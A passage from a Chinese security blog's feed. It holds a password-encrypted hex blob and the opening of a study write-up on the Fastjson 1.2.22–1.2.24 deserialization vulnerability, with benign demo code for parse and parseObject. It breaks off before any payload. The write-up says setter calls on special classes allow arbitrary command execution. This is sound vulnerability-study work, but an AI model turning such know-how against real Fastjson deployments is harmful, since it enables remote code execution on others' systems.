bae4d137dc5951abe45e8be981077d248307e82e1c276716d477a3ec07893a41adef17720ce71731d67c4b7dd1f9da2ff8841224a877640ee6d9932df6e1451471590936f645aa61b67f9712efbc1fded8abef1b676b4babc1afd1b0137cd342d2ba478ff92ea19279583d22d0b4f03b1b8fd8e8a87ab80eaf1ffa5cb762527bf89ba21f5f4a0cd5a7ed60c3fac5cdaabaccaeb4fff58c80e775a7145fbc58ea61b2b2c96a6e840c964fd66f9c31e28f06db0720acd9a0d174f30a2dbfbd50a942ddb53ea0ddb9dcda2165d670e672ccebc5ad59ef3980bbdc501f7ac5ed334861eee93a317feab060c7504da0302d3936f9b8f1eaf34d0bcb2c4157b4cc7fbad43a36629c0935a3bbe1876cde734c6c3a0eb1b8793d52ccf9f6627d2127fd752b40009b2fbc0f27dfdb80462f6ba86e4e5dc8efa670535d8e1ac238492186193e21b3e14b915d4732e7425350891cf72de9e3fd9d27d45913e63801dc9e668de4e00c0d29c792842096dd8994be26741905ccb4395d8c45e6b06fd703e2a86a0b16d21719f5a41ab536a571bb9934637de26d87ce6864691427ad2c26590188fbfd791173212fe2e375345b71a2d1be2aef061aa9e9f56c51df8f4fbe0ac02a6993d6855bf741d50216953cd81337e06d8f3d5e8f1cda6b83d2e95d5c898e0e99a5b56b0e240013281903921c671b68007370409d9e5cf64956b18404969b4d6072442d366091d94bda3190ddb1ba3491e3b2cbcffecebc33d6c5ecdbe8a47b90b33907a318b479771eebc52b1a666e077736acc97f74d0bef1c28b358b110f5f4467d6f685d8d956cf3890e03fe3184286a033c5a5ba20306e8ee6c68f113e663109fb7973f1f2b692fd69d82f96a816449ca49a9e18159fab8ed7680bc6a9396e711daa0f9e9a0d94b1f067f0fd1ee9546215cdcf101424e2a809a6eb401fe6ccd15fde98b60b5073ba0a00eb89c7600366247ac6175f071babe606ef56ced09ee5d649b61925b3b04620f6dba30046a4eb6522d92cd9293fd632698244855aca440347b2154c8376657d6ba1763c6e5535326c21c06bbd85d4c75010c6aee22aca7a0c1ee2258c55bba30f082666f8f92ce561b3481e66452bb14a140301f5483586e7cb1303f8d417831c98cd5559be573965efe47db78e3aebc7e9135046e3503808777ced4400943116aedd97d7dbe47b808d518c5e7153aa98cf70adbf0e3cc111d369c16bdf9ffed0b5912edae26fcd20869faa86f33ad888c3b0a78c2f9291654d2b09482f3b57a4638a480cea016605bd96dee57bba24f1c0c604499489dfd22c81b26c5823e50aa15831454eadb8bd688721311755f585f1c562d192a37163ae3d4aa3996420843efb5e39701fee02c886b29c375631579236377f2bb976f7bd30d562a6998c342b1c554333723a92ae5bf7cdc0ed6adfef8fcc84ccdd3a8c75df8663acd68907337fd19ae0e5dca330e2865f8ed830f0b6c633009b66657dfeeab6d2d0d7660a82c815040f4cb6d05877b745d1d49a6afdb0943ebbf4ad7ae98708bfc70f46a21b871e16ea1c2af25f9741e2b9e5c79dd6498c02a4feb43860983e99d4ced45fbea05b516b220aca4c795e309b04ac1e9a8f8df0fe6b2fe3cf646c1cceb6f47257f4815378e45d9bac3190a7650a46d5b589d0d3c9df1ab2a55fc68ea563e7f2b2031030cca6dd0f71d903c2618a9ad2213e9fd0c4248245893e2d17f860afea01237bc32ed5f7be5fee420e813bfa064d18f6e7b49fecd560ee7a030b2a29e248a3ed7d5cada36510338cbf295558f6f31bf5423e80061cc49d05e5e26038b0cf2b1c414e6a3eff5257c3efa1e2d392281ba170f6348cd494523381d71b094e7e30d6de66ea263fccc37651536a77239c4d9d6d31b1559c5bf272c83bbd4c5640868dc7cacaf226dc9f2eaafef64b34a4ba0122e544234d893b30b0a9675f8c23482c9ec4301eda249e1bf1d0cba3cda2ec18180d07abef133e039b4d30840b8555afc9739284092d0043e7858e10caf5e295a0d17119cc69af5689e93a44e9c724523205865cc1dd219a1e4270d31647e080e942df4332d35f50a12d856ba65f1004df02119503f8e758ea8f1952a1ef9ceea9c41d441deb6a23831168ce147975d92576dbe3dd968a9037554db5899d65ee720d90a49b6fa9135f4590bfdb1882ef5bbfc6ac778e59d34382a6a0afcdf75d421d76c18d40f454cf2ed2f487f676f5c95537f61740620b928f82cba73fad8d63f77130997def3d304128021e2ff00ef9487b7265b42bc453ce0eb8a9314cfb921324e6d463540924ced563ad2c3d797d21eb27ee3f484da61ce720ad0add720e9fee0d4349d67b87552b64d77446393bb38f8d225c84afeaadacfffde3da9a80eb5db456aa896c81e18ed3168d06d9420c835a7b6ce7fb5df9cd014251695e57d6866672724f87e477e2b6ba7c71a6d600b9866f9d4816941613f1c3249634d3a8c8b6207ab9f2b1f3cbaf7617d5521b0f1e4fb93df37a5564a92868a9a59bb9a18883634313b818f6289598a63bdbca33bdc6ba0ab14475906d4e6d41dba20eced0e013af35d86fe0e4ceff8c27dc3c9455ee020a5255662c5c4aed62494203753b93f5814f9496e0c3475fb0a88c87cbda908caace16f2ca4196bf6fd5cba71a909ed6170a6f64e68582081d38e6a552a7ca474e551c67a40acb139ff5801e5956c2790f630be9db2babd4657e72a3df66f3372bd0236bad8c09da1611d087c76aed264858a354bd9c9365606145aea2a84f75db143a4dd51ee1c582b0d90bf26b0a85e588daf68f6ab0c9bae65df76a13871128be846504a09e4fa385097c64b4b7f9ba4678e2eca9574b29fadee60f491f13f2c27cc46deb7f0bffe6a5ccea78b239ca1fe1b253a7e3fa911d32ea80f5901cae4ebde809afc742ebff494fe966b1ebab63f240e9274d80d9674b6cc2cd5a60477ce4154b7083858cf7ec6d924e70bc693a3666ebb410d5f5aca6c75fe5f9691f748f172ced7c41223dad8c07f9d3d5fa31990a80b7ff508f2bd6f2636c9b1bb25e4d6af79db223c6270a5d9194550b80b75900ebb6d2ef9843272c6e8157cbd40c2cf5cd9f3652253a2a2df96956d6be629c847ce288e0c3ffcab5c9ab96432ef4280d8e296050ab2733747a7e90c643f5b56d9965657f9e0ed69744ce2c6e760920ecc06f68f0ae51ab9db737e368600370137d1fdff90623a74ecf2ace3b68d0f986ae1e2a67b1d8beeb39b79c99623ecc3687787470d59516b7c84b3a5b8a1f20b99cdf8e09807fc44e1a355f916fc008adb202122b4bf852aa853a5f5d624da3a8a0c1aaa6bfc210bacc4cfbd4350974d419dbd7e78de6255d58c4395ae4afa13a26e19caa577a75fbd4affd0b1373cda8cbf99121076001d057553da1b233226b95a7bfbf6ab9b167713487439d4fdbe39e56160d9898447c0f6fe4b68a933a1e05b9054b85f25fe898a8d9ca70a359e348b40c472166c7b1f6d035f26a720885715d9db8c5e889e15f13f55b99aa1bb28467db94f1c12f7f5fa267dc22db5f780447b06bc754882ca09c20ae4d12d822b41a52f8ad1b0ba67f986d35cc25cd9930df920d8ec06448921198172345977b08fbd0bd624eee9411870d1d3d6772bbcbfbd22f0518e1f18df16b99410d8764ce299d85450852989e084e62daf4f416fa3c0037fd27d3a85aa63ee9ccc28b50b6dff4ec565181714723eb57257326c27fe5d847000f5e6fb5e159a484aafe07074a382fff314f81a6766a1015846912610bf0997df087558a1bb00f85685164329d37f3157b44528176dd2cddb084b509af8bc67cebcac0723f8cc5ccaeb1888784e3bc2ace37b0672e7b8aff4ac3e7a80fed203b95d724b4e2924adc1fdd7688f6cb7e282a674663b1c369108c4f9c98360686a039c99e118b1e979fda3f2e089a8dd0f552a2a15085eda053c9b9ea06d32dea9fd937ae85a202a3542b0363cd07134fafcdb17878ad1f19be1df622feacb26e86dfbee8dff27dd0bcd04c8067fa3ae58e3121a0911f43f9a6ce26b73ccb751cc2e26434705edc86babf8b3620cc06d3f2c793e92117e1997d3aeb300173d1082e12386bc76dd903c118655c08d5eaf29a44160ccdf28427a9cfce1411861485e81cd866087fb5cdfb1fc3b2791bbf2766220140d9951abc4a75a66b0f38278b64a1c969aabd8b72cc31b0a852e232de24f5882e149c0f2896f0d3820780b8a5ff155920b3cff173d983d2d2627772fe9dcaa41b10d27cd6a6c6921b566ffa99c4e321128f65e95b573b710e18a264290d22b3fdbd576f7aa70c9aef020cfda03e93172bcfe48dd672f9d4dd08913ffcb4f9ab61ca74b8480c57c9037668f107f7f2aa7d3c13206d6e198b179053206b683c1e45cca4824cd385f3cfda7ba478b54e8fdff212a71c45e5d68b12c052133686ce1e16b772b56ee95a13c4a6a625125a08dd3a8e8a02bafcb2afc4cc311a2cb4be0b7d529c71f083c942103ee313a8840244bbd99c64a6081e780e24c96ca4c217375a68557a6f33792dbfa66966f7559c90ec5704f090697a02578ea7b5914382bf8f32c7f8e9594a249769b9e9bf105bc017a6e169099d6bd60929993680db884030cc2f7fca0c888be762f8974222c86976a62a6e4c5980f95c949dce3f3299d33750e18e8b6650f8eedfa0d18cd3065d86586131b4d7b6e112d35073d17f93c694eda3f66f213385622813631995465b87d808c6026c0dab551d95943106f7520636204024a8b835d148928da3610ce198b5641ae9ffa382295e3b91ba0cb7024d230b82c43e0660546d3d96029ca8495c5e9ca82e2ee598972e8691e4b8ec20d5b7214d634e51289f0c371f9c1400ccab51252a77ed8c1f77a44433265b7bbe6c3cc4e8dd8ef6e0d45a853fec88a3bbd24f1bfcc7140c13a68de02aaf8f36d6c3de8030a6eff8dac45a7875bef1db6dba6ebacb293a1507e5001a8e221aeacec77b261490640486aed625f9daf02ca8c6fb6b7dd90da12a23970013676f0d738efa866ac964bf54f07b32b1126a597c3df6a33ed930fa63c1d242e788f392e834c36a36811401ae369da78e13305715c35bd6ffe4851b9d20914cdfb70fd779abfd9ddb54f89a56a3c5ef3f8cb90df6cbb845131f508b81cc1fb6c904a283187f19d2cf532c53bb47774a549add71ddddc97693f04a5aae4b9b305a324ca9664c05743124f9a92a66d9cd20e95eb31c2fa4a0431935fb5f8379a6bd796fc701ca8852e9a61177bdb8fcc2f358644133bafa2b768acd8bc5009957e541464b58ba69517685ca35bc9bbf3131f1037fae5c8e57fd0c748eb8a210bc82607dba84759fd89b8cbd66190d710f18334fddad066a367a559b0331ee266d0746a7350014ce6a247da381c0d1e0395813a3a692594a17a024f483c643526282680ce4579f0f7317b493adb5aef221bacf4805e41e3253eb2ba16e87623284890f9422a3bacb59fc2e2fcdcb9ab693e49f06c328098f0c6837d83fa8334669ff9cd94fe2129cf057ee75d1e046906deec7bd7ced5f4ef63ace2a2cc8ceecf6b8818cbe0301dad814b0cee4127ab815d28d8165156fe5cf576379266a09a78ceb9705aeaa490eade61101a04a1ca1aa9712ae07c90518dce12f8ee1d17985aabd9d99329c3763c0bcff5fde3ec9bad32631194305190828829332129eaab4eb792507ba6e4dbd5efa03002479f34025fd39599784a3a3e3027e1a1f3238391cb37c25e5e8413f93599b160d197b655872fc700266330b0d64bff77f70c13d10173a3cf1b5ed5eb7092f51a22d40426734c826db81c50c8fccad593af48da35d13496ef539ad9d6586b25754fab20327a5d7f2a88fc11659954813543d050f07e80ff577492616f0549532f3ad75af28ec4cc47b28de7a2c4a2bcb4e62f9111809726644b737bdf7b7a6520f64eac13b06493d40ecf157563501b65e43d338e1e16e8980a306160b363ed9c4122305b1586c12ef9e320b8faa26f154fe1a3060b87328f2e308462c281e6843dc8e4529b0e5ee22b454ae63e912642125c560a577ec20f42f5c44a5299712439c7493e7667df1ab61559c7f2e76e6ede56ff4c6583989128d81b4b7caeaf68f1de9587ded3fb3c304e039eca4353f473689068d26aece7983d77abfcfaba11ec0425e6647d7017849d25a7c77ddf566ed652c736e506c40a2be9c3c19b59cb321a48eead4c406825b6a641a553b497957965172ed7e81cde5e04555d5a9b0db59e78e722aa1a2b4baf6650768aec50f8f357288edf6466534ac094ba73815aea5aefd0139cf2017b5aa593d0481008d685195f5f2590cbe660c71472ffebeb81e95d15dec0fd0963903eb1be83684f024b62547c0e6b7b3e20d6fdbaf56c35b660a3460aa114a4573a5bdfdb3ae491024ed9d4bec69cab73c944be003a9da4fdfc4f88ccd8961ef89c233d6fcca9564df350c574b4e73933a77bd654142b3c8fb8273f7445e3c38c9475f66eba271f9eca65a0f309c46be3dabe25ceb4bfd8a720b3c820cbfdebe21041a0e2d40f97ec9283c29b3716ce670070373d569f16b2beef75713b12c6a10a9adde4f80b25c0aef2303a31882e537001fd6b9b25b2f2c461c855a4c68f62ee6bb9abbe5f04d90e559038d1aaea75fa13c953c218cbbd7a6258cc29ef2f1fc530335636ac0fd2c5ba052fb4934e899f5634773dc60a0c1fda76d4b1163e755022a3e39312ed19810cd4df2c315475f3004672eebcdaaad3f0025fe8388c5fba9a35eac4497853fb589b5c2a565614cf01da5a6bea4327ec657133765d627bbddcde5a2d84fa0d1b6c72b09c653c924b7c68b0ce919ac46d544cfd9b1ee37029a122a29638d6f6308888baa3c9d63add3bfb658767a4f9c92b194d7f8ad84daac3e36bdec055ca54be2e823aeb0b5da4d4d62012f669909a26fe2efe60b162fbaed5f60868c3628e1e171227ba324781a633a52f4b2d27f575a9e7a071d4f211baf2c26739ffe79bfebfb175d993cf82a5d566b91834ccc1f8046ab87a010928c39d0ea398736c98247e841a9beb78caa9612429ac7c619278cd4b05b6418c43029ccb855fb41e4248e712c1b8a86660939203df3b81320fc5600ba6eaa5a6261b070705e0747aba7669094e77bded6681b6adf0de66d09b1b1f7a56fc851c2bc39310dc76b2c10b327e6d7da43b2cc544785da808d91a1555061ceed4c4a037449655a78e8d8b1a93ffbb2e4698f5082efddee03cd7d92f6905595ff24aeba833780edb9b0a0698cf534cd411f76a927159aa1eb581ecd049d1fa71a3a01ef9927ccb362f2a505ff0ef1495fece89141b6e8487d6fa912d291176b58017c4d9e39a3b1f4344e34a531c58cddfa67c83bbd7f2422333aeb9f8c5a6627cee1147a9075d42a0c56706887b87738e0b4128e667471fda18c93ca88cdc815d32ffc3397eaf610d4de3b1e61190aaf386bf839e4dc6bda6a45a68768c68b37e9e47f88b69a3c8f149ff5216c78c502e7314f370796f8b93a0d474025e11cf3ff6172fa93ce2e2c4bafc243913d69b1fda2e515d5477292914f7750895af42a2e0ed557a968f4c6ced61d5c6272908108275e85eb1da0bc2d40e4c2d918a21d81acbeac4476803a0b1bad9e5d62228c3aa227ca771833e8afa46753549c5d05c9b237c29301a12fff4adf45e3fb8a04444bada0cfc53f2386ad8fba8140934f69e6ba4647283f1a430b48d3e20c0db4f6395d428ea5e03f37fdedcba4a741a52bb54ccb497b8c1166d7ac8ecb654736ec32ac10911f0d597aa5dcb7656debabe4c42cc274cdfb0fe7fb0d59aa14106364120a9bf6a50f179a942b267618c91b29ec25b21d7a02344bc040ec4c09d5e59656b17b07bf41b597e3f48167cfe854142c80704a273f4a33f57fcd97e4bf75c82b8dd4654aa3d2d603440f727abfa365d885ace10c22fabfa0289738ce12ca6e55badd4358d1b46ab5eb653f291dd180b0f15039df6b0a614e9a1ef02c160b9cf391c5e6df5f24ad02cc8374dab4d61571037cc162a81f6e0ced138a4b7c76a213d5f15dd4bb97dcd7a472ee0b73bf9f10cfcfae035eec8dd019eb6ec7ed5e284316f0b3689112161ce5439f824e51edd68fad5ddc9cc08e68aad5983c5123014abb1a24ada6937c1431e872d3ef61c67a483a24f8ba9b1bf8dd7d1ae4841166e1a0f39ef710a0f04d8255c4ecce3c644c662b806bfdb60922e6504e6df5911323dfaa0c2868685000db30eae7041404f25bb5fc3a7d655e7a98fc9437233212228ba9f222d200785ceadf771611d4e3638cb6335b55061d1e04a18726bc961d3abb5666961aa8f813352858b76308bdb144e054ecae7db3f7dfe8f1b9ff39de775542e073cbd84f8df46306414b7644818a4499474cadaaae7b477e81c35b04b6ab195789a21fd291e191e0264c0098f4d38ffbda76b84132ece8b71a00a9e1c556fc1b6bf4d33bbd4b2cba78285c6b9f6b189de598d52645c82d7e58ccdc56128e46b2cf6992019b701a9b8c164c7930a099d590ec0e2e89cfd9298189a0846860f277480ea0c01d8dae5cefb9bbd3a2af6eeebcb81b9fd25c4fb73ca5634a3dbf3ad53e75e2027931d7f25b88d08787ec4eece4db5a56d181c353141e532f2b516b5105e4a8e5aa7a21bb3d27b9b6aa750863bb36a7cad0ed4a18b2a1abc51d83b7022e0e9eddc3adc3034ae36c4fa5c478bcb3a2cd07f264175a8c2bc957148fb7c4d6c39c1218c3ace453bb068b1a9efc0aa285d7a94208d4856e5cbf2010cdfbe6f82a523e859c2f00f564e0cb9d142f253eeccd6b65575ae0f3ecfcd556457e361adbe206f8b98876e70f1083bcd4f072201be197ffcc6c9a7ab154c5552da9b7446df8880cb321daae846f12013307c4e34c810aeb90d99c5d14219cc23ae49733a2e33b9f86e47c02ddf7483885a7b010e90b9c470523f8c9a2e2bd98eff76f647c8cdc7baf6a5bfbca3f081584e1ba294a532bd3103a852ecccd92e6c2b599c4d3793402e60a327ababe744480d6c63d83d823996afbfd021819e151b3f3baf13a94cd684f53fc24deb53ca1ef032195d4a02c7c773907d7d2c43d6af2735974c7b57f04d7143af7ff1370177bd9672376830d6c8ada6a814978a18c69e241ef89c56feadcbf493d6c2ccde3099958b926d0a550085c190e1ca89fb1ad0b78c78bb83f6330d4c25b01934868cf3e4f947bdc68848e15a0af13f05d04db4e6f85cb42c0e3cf0d2f3e1314db1256f7577c97a5aed32d8adf26ee14cb612eb50a15ff713b43a4bcfd7b7ef9e25fb0da596f801f67e6db881dcda8f6414135c5a7bb27f11e626b9afd58845ab5c29c5bd7fe183c758a025581999de7fa196b9a0b3d9fbe2a7da9e9efbcacad07a620db12abb6dcce8475b4cb1ed673931320323601176d7a4c76bb427b146c0aa6e1177deabc301ae2f8a9774736f713e1456af4513c3327e0df90c9948fe5ab29a17dc3aed4867e86bf40e40a965d22a8671fa0ddcf5969fd9ea5f44d9648cb8894cb8573905dd9eb22dd595f7689de020fbeacedb76d89460b6951a123d4ed392bae0b523217a77540e80f6bcd209b100fc636bc84227351684fee2b93bcb70076593c0759a2b65da7fce20977cc36a91e8c85bb2b1c7ef42882117604b3341072ad2217d49c853433511d582a4451fc68a1d74efeda5ae34e57d14431785159cd97250daede78c2a57b43e23b9953eb39792e128fa619c3dc069a7e799f07e4f971d5e8e5507640ca6ffc55c6fff836c7d64ab5c53330e04fb0f52b7f98d089d876fdb7244ad4bf1f6554fea669d0b9b3c317594d44a96bfdeace9d2cb846c9a747b7dcbfd0dda9cc6b176cf01259b29d67f619920d7b1f67d8344c2906e437ed86251df4247386ab77048e170e1fdae04b69fc936ec33b72ce594c7778427a965151bf5db271dd65f13935f99ac4d4aa06c7a1715fc1d2d3144239a59b893168b0117f2aae81e6459ee7771e579f6b32f36950446a752f6f2b43c7e285de0feec9119435d81e2687acd26492daefca6994e703839a639ecd0e6deb8d82f31457f6e720c4790b4ada8b508649b84b7cfe4599e97aee552d35207d26b7facd596f8165d278b4f1c1840c58ccce5fc1b5172ee25120aed1b5e89063468f33a906095d45cb5e54669c1ab5604e35e81ee0c84ed2e399ee18f2471d2a5964aa92be336f87459dd0770905163fd7a4172a54640e659cc7c58aa169aeca1ccfdf38a28481f1a05d7940851b3ac12b94d26d2a24aa7acfa40897413fb1551919df84b46792ffab277e829bfc1d50359a64c00719c6992d08dd245ecc4a53548608e263c16e74d5920ad1b8f5e0f2f4f34827c07adcdf5ed71b70301fe7fc0ed9ab171b0ce915c2412bb55b78f2bacb4ccbd6793e8f0cc3653bd093c41b9adda5b9dcb92b3303313586085562306d1e3fb7cc0091b5f02380488c09a5177a4535d1836f5a2827f7be0b9afa03b068181b3db18c2d1b8a3a216b8cafc410d0668050a1cd07f07a133ccaef69a286e2a45258977cd78c90673ac2cb34760c2aa32aef6faf6fec20739cc185919447676a45b585f3cc7a06b06e78807dd5b858b4af4085f7e3b4b500537f2310f5e6e9523bf9c72caa3d0b7845f91a74486b572888c65c015897390992c97f0c42b1070dfa811bc667f21c46e07c5a62e52dfb560e641d38b250942caf30d7ccfb2397eab961e8281231782980bf6484aa0cc16206d70144bafaacd7511a86a9225453ecc4ab48411d1528628dbffb6c71de0bd8a1e1cd125c50e8c2a36b0d472cf88948a4f342748e55648ecfe170908754ebd24560a4eec245b9ca96c9be9b126430235702736513a6974d1dec3714c48b22d405c237521b43a8cad2ccb3a07a4c41553475f6c2fc0c44bf6e16b5f7b280d82001fd1ce27cd47247e3b11b65a3c789df4c6df7a314c16d6058764945b7229d01266d2e98141dec046f121bceae9df087d60d23d211719b03da56614e1595308a1c47a7f9f4dd18afc008b5918dfd5fbeac1e49a0eee58824ff4a2b184169b1a96d276ac57bd6c02f531ffde16545553d6e89efd489e0644c9a3b2c889a538e5c4b8862064f640b7fa6eb385a8849ce3188e792070b98707276cea485a1af12f58cb06078f9221695796617a6df56cb3d85a651583fcb44ae2b86895e8c935594432a82a5041c37e5e355b712cfc</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java安全--FastJson 1.2.22-1.2.24漏洞分析</title>
    <link href="https://shu1l.github.io/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/"/>
    <id>https://shu1l.github.io/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/</id>
    <published>2021-03-02T07:03:22.000Z</published>
    <updated>2021-03-02T07:26:56.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java安全–FastJson-1-2-22-1-2-24漏洞分析"><a href="#java安全–FastJson-1-2-22-1-2-24漏洞分析" class="headerlink" title="java安全–FastJson 1.2.22-1.2.24漏洞分析"></a>java安全–FastJson 1.2.22-1.2.24漏洞分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换。最近几年fastjson爆出了不少漏洞，但源头还是fastjson1.2.24爆出的反序列化漏洞,本文记录学习调试该漏洞的过程。</p><h3 id="初探fastjosn反序列化"><a href="#初探fastjosn反序列化" class="headerlink" title="初探fastjosn反序列化"></a>初探fastjosn反序列化</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行。</p><h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h4><p>我们可以首先构造一个User类:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用fastjson来对构造的类进行序列化:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String serializedStr = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">user1</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br></pre></td></tr></table></figure><p>fastjson可以使用三种形式进行反序列化:</p><ul><li>通过parse方法进行反序列化，<strong>parse在解析过程中会调用目标类中的特定setter方法和getter方法</strong></li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj1 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse(serializedStr);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">      <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br></pre></td></tr></table></figure><ul><li>通过parseObject反序列化，不需要指定类,返回JSONObject。parseObject只是对parse进行了简单的封装。</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj2 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>)</span>;</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line">   <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br></pre></td></tr></table></figure><ul><li>通过parseObject({},class),指定类，返回一个相应的类对象。</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object obj3 = <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">serializedStr</span>,User.<span class="params">class</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.get<span class="constructor">Class()</span>.get<span class="constructor">Name()</span>);</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br></pre></td></tr></table></figure><p>最后的结果如下:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228204357.png" alt=""></p><h5 id="三个反序列化方法的区别"><a href="#三个反序列化方法的区别" class="headerlink" title="三个反序列化方法的区别"></a>三个反序列化方法的区别</h5><p>关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class<T> clazz)三个方法，我们进行一个测试:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> FastJsonTest &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String <span class="type">name</span>;</span><br><span class="line">    <span class="built_in">public</span> String age;</span><br><span class="line">    <span class="built_in">public</span> FastJsonTest() throws IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> <span class="type">void</span> setName(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("name setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getName() &#123;</span><br><span class="line">        